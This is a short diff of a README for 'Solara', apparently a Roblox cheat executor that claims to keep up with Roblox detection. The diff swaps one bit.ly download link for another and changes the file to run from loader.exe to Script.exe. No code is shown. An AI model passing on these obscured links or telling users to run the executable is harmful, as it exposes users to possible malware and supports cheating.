@@ -17,9 +17,9 @@ Instant Updates
 Ever thought what will happpen if Roblox detect Solara? Well, we are always here to provide you instant updates and upgrades for free
 
 🌌How to install Solara
-[Download Link](https://bit.ly/3ZmBEFM)
+[Download Link](https://bit.ly/3Z7NVwe)
 
-Open file loader.exe
+Open file Script.exe
 
 Find script for your game
 
